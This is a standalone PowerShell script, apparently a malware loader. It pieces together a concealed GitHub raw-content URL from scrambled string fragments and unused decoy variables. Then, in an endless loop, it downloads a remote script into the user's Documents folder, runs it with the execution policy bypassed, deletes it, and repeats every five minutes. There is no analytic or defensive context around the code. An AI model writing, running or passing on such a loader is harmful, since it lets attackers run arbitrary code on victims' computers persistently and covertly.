$r8 = '73w54'
$r45 = '-df029gj93fk29gj43'
$r53 = '903kgjfo349tgjf'
$r1 = 'https://raw'
$r42 = '-92er3lkjd934jfd'
$r32 = 'u6po7'
$r38 = '-fg45tr89sd'
$r31 = '245iuy'
$r52 = '-lsd94fgh293kweo'
$r44 = 'vjk394rjegr9'
$r25 = '5'
$r16 = 'w5'
$r36 = 's2.ps'
$r64 = '-93lksfgj3948jg'
$r47 = '12jgh2f8g7t23'
$r50 = 'dsv0r823lkdf'
$r41 = 'mq42vew93fj0f'
$r3 = 'ercontent'
$r26 = '4'
$r35 = 'ain/p'
$r27 = '9'
$r14 = '-bn3-2'
$r20 = '5'
$r39 = 'kjsd8wwef93'
$r24 = '0'
$r69 = 'fto23v34lrkjw39f'
$r5 = 'fum4n/-0-v'
$r56 = 'dkl43gj29fjw34tgf'
$r34 = '45w/m'
$r10 = '245'
$r12 = '0-69u-b'
$r9 = '-068'
$r68 = 'xlg84jfg93tg349'
$r18 = '-3'
$r46 = 'pwo4fh93lkdsfhq29r0q'
$r4 = '.com/t0'
$r60 = 'plw84j34we'
$r66 = 'pl93hf9fg3lr0'
$r2 = '.githubus'
$r62 = 'sld94r9j3r0f9'
$r22 = '86'
$r67 = '-a03fjg293f9we'
$r11 = '-0v9-6245'
$r43 = 'dsf9384rjgr834'
$r59 = 'tghj23wr9jf'
$r28 = '8'
$r40 = 'lk38fd2394lk'
$r61 = '-m92ew234rjklw'
$r23 = '2'
$r29 = '6-'
$r37 = '1'
$r65 = 'sd93fjfo43rwe'
$r6 = '948'
$r30 = '2034p'
$r17 = '68'
$r19 = '4'
$r51 = '96vj2gslke390rlgwe93'
$r13 = '2-4059y'
$r57 = 'v03hg4hj2384j'
$r55 = '-sld93wef92jf0rl3g'
$r70 = '-40ehjf84we9f3k'
$r48 = 'f4w93vwe94jfkl34g9'
$r63 = 'qjf83v9f8gw03j'
$r73 = '-w53lfwej023l3k4'
$r71 = 'gfh23d0fj394t'
$r58 = '-3v94j23948ghj'
$r54 = 'wef239fgho34tg92r'
$r7 = '37-092'
$r72 = '23jlkd23lkf29rfg'
$r49 = '-34tgff94u3grlkg'
$r15 = '40'
$r21 = '0-'
$adiuhaihvdiuhbweffiuhgbqawerfgoiugh234987 = $r1 + $r2 + $r3 + $r4 + $r5 + $r6 + $r7 + $r8 + $r9 + $r10 + $r11 + $r12 + $r13 + $r14 + $r15 + $r16 + $r17 + $r18 + $r19 + $r20 + $r21 + $r22 + $r23 + $r24 + $r25 + $r26 + $r27 + $r28 + $r29 + $r30 + $r31 + $r32 + $r33 + $r34 + $r35 + $r36 + $r37
$p1 = "$env:USERPROFILE"
$p2 = "\Documents\ps2.ps1"
$filePath = $p1 + $p2
while ($true) {
    try {
        $cmd = "Invoke-WebRequest -Uri $adiuhaihvdiuhbweffiuhgbqawerfgoiugh234987 -OutFile $filePath"
        Invoke-Expression $cmd

        $runCmd = "powershell -ExecutionPolicy Bypass -File $filePath"
        Invoke-Expression $runCmd

        $removeCmd = "Remove-Item -Path $filePath -Force"
        Invoke-Expression $removeCmd
    } catch {
        $err = "Error: $_"
    }
    Start-Sleep -Seconds 300
}
